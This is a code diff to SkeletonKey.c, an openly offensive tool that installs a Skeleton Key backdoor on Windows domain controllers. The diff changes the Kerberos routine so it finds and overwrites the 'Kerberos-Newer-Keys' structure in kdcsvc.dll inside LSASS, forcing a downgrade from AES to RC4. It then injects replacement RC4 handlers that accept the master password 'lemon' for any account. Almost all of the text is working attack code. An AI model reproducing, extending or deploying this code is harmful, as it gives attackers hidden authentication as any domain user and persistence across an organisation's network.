@@ -1,6 +1,6 @@
 /*
 * Author : Angelo Frasca Caccia (lem0nSec_)
-* Data : 21/12/2023
+* Data : 06/04/2024
 * Title : SkeletonKey.c
 * Website : https://github.com/lem0nSec/SkeletonKey
 */
@@ -9,7 +9,7 @@
 #include "SkeletonKey.h"
 
 
-wchar_t cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";
+wchar_t cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll", kdcsvc[] = L"kdcsvc.dll", newerKey[] = L"Kerberos-Newer-Keys";
 
 
 #pragma optimize("", off)
@@ -114,14 +114,14 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 {
 	BOOL status = FALSE;
 	PCDLOCATECSYSTEM CDLocateCSystem = 0;
-	PKERB_ECRYPT pCrypt_aes128 = 0, pCrypt_aes256 = 0, pCrypt = 0;
+	PKERB_ECRYPT pCrypt = 0;
 	SK_MODULE_INFORMATION pCryptInfo = { 0 };
 	HMODULE LocalCryptdllBase = 0;
 	LPVOID pattern_data = 0, pattern_struct = 0;
 	BOOL aesPackagesDisabled = FALSE;
 	LPVOID Buffer = 0, RemoteFunctions = 0, pInitialize = 0, pDecrypt = 0;
 	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_rc4_end - (PBYTE)Skel_rc4_init);
-	unsigned char patch[] = "\xff\x00\x00\x00";
+	UNICODE_STRING patch = { 0 };
 	SK_FUNCTION_PTR RemotePtrs[] = {
 		{L"ntdll.dll", "memcpy", (PVOID)0x4141414141414141, NULL},
 		{L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL},
@@ -132,88 +132,104 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 
 	if (Skel_GetRemoteModuleInformation(processID, L"kdcsvc.dll", &pCryptInfo))
 	{
-		SecureZeroMemory(&pCryptInfo, sizeof(SK_MODULE_INFORMATION));
-		LocalCryptdllBase = GetModuleHandle(cryptdll);
-		if (LocalCryptdllBase == NULL)
+		pattern_data = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, (LPCSTR)newerKey, wcslen(newerKey));
+		if (pattern_data != NULL)
 		{
-			LocalCryptdllBase = LoadLibrary(cryptdll);
-		}
-		if (LocalCryptdllBase != NULL)
-		{
-			CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
-			if (CDLocateCSystem != 0)
+			pattern_struct = Skel_SearchRemotePatternInLoadedModule(hProcess, &pCryptInfo, &pattern_data, sizeof(PVOID));
+			if (pattern_struct != NULL)
 			{
-				if ((NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_AES128, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_AES256, &pCrypt_aes256) == 0)))
-				{
-					PRINT_SUCCESS(L"Packages : AES128 : 0x%-016p | 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
-					if (
-						WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL) &&
-						WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL)
-						)
-					{
-						aesPackagesDisabled = TRUE;
-					}
-				}
-				else
-					PRINT_ERROR(L"AES packages not found\n");
+				pattern_struct = (LPVOID)((PBYTE)pattern_struct - FIELD_OFFSET(LSA_UNICODE_STRING, Buffer));
+				aesPackagesDisabled = WriteProcessMemory(hProcess, pattern_struct, &patch, sizeof(UNICODE_STRING), NULL);
 			}
+			else
+			{
+				PRINT_ERROR(L"Second pattern not found (struct)\n");
+				goto exit;
+			}
+		}
+		else
+		{
+			PRINT_ERROR(L"First pattern not found (string)\n");
+			goto exit;
 		}
 
 		if (aesPackagesDisabled)
 		{
-			PRINT_SUCCESS(L"AES packages patched. Fallback to RC4 expected.\n");
-			if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
+			PRINT_SUCCESS(L"AES authentication is now disabled. Fallback to RC4 expected.\n");
+			LocalCryptdllBase = GetModuleHandle(cryptdll);
+			if (LocalCryptdllBase == NULL)
 			{
-				PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
-				Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
-				if (Buffer != NULL)
+				LocalCryptdllBase = LoadLibrary(cryptdll);
+			}
+			if (LocalCryptdllBase != NULL)
+			{
+				CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
+				if (CDLocateCSystem != 0)
 				{
-					RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
-					RemotePtrs[3].Ptr = pCrypt->Initialize;
-					RemotePtrs[4].Ptr = pCrypt->Decrypt;
-					RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
-					if (RemoteFunctions != NULL)
+					if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
 					{
-						PRINT_SUCCESS(L"Handlers up and ready\n");
-						pInitialize = RemoteFunctions;
-						pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
-						if (
-							(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
-							(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
-							)
+						PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
+						Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
+						if (Buffer != NULL)
 						{
-							PRINT_SUCCESS(L"Connectors patched. Master password set to 'lemon'\n");
-							status = TRUE;
+							RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
+							RemotePtrs[3].Ptr = pCrypt->Initialize;
+							RemotePtrs[4].Ptr = pCrypt->Decrypt;
+							RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)), TRUE);
+							if (RemoteFunctions != NULL)
+							{
+								PRINT_SUCCESS(L"Handlers up and ready\n");
+								pInitialize = RemoteFunctions;
+								pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
+								if (
+									(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
+									(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
+									)
+								{
+									PRINT_SUCCESS(L"Connectors patched. Master password set to 'lemon'\n");
+									status = TRUE;
+								}
+								else
+								{
+									PRINT_ERROR(L"Patching error. Freeing memory...\n");
+									VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
+								}
+							}
+							else
+								PRINT_ERROR(L"Remote function building error.\n");
 						}
 						else
-						{
-							PRINT_ERROR(L"Patching error. Freeing memory...\n");
-							VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
-						}
+							PRINT_ERROR(L"Heap allocation error.\n");
 					}
 					else
-						PRINT_ERROR(L"Remote function building error.\n");
+						PRINT_ERROR(L"CDLocateCSystem error (could not locate RC4 authentication package).\n");
 				}
 				else
-					PRINT_ERROR(L"Heap allocation error.\n");
+					PRINT_ERROR(L"CDLocateCSystem error (could not locate function).\n");
 			}
 			else
-				PRINT_ERROR(L"CDLocateCSystem error.\n");
+				PRINT_ERROR(L"Cryptdll.dll base could not be retrieved.\n");
 		}
 		else
 			PRINT_ERROR(L"RC4 downgrading error.\n");
 	}
 	else
-		PRINT_ERROR(L"kdcsvc.dll not found in %d. Is it a domain controller?", processID);
+	{
+		PRINT_ERROR(L"kdcsvc.dll not found in %d. Is it a domain controller?\n", processID);
+		goto exit;
+	}
 
 	SecureZeroMemory(Buffer, szFunc);
 	LocalFree(Buffer);
 	FreeLibrary(LocalCryptdllBase);
-	CloseHandle(hProcess);
 
+exit:
+	CloseHandle(hProcess);
+	SecureZeroMemory(&pCryptInfo, sizeof(SK_MODULE_INFORMATION));
 	return status;
 
 }
+
 
 BOOL Skel_InstallOnNtlmAuth(DWORD processID, HANDLE hProcess)
 {
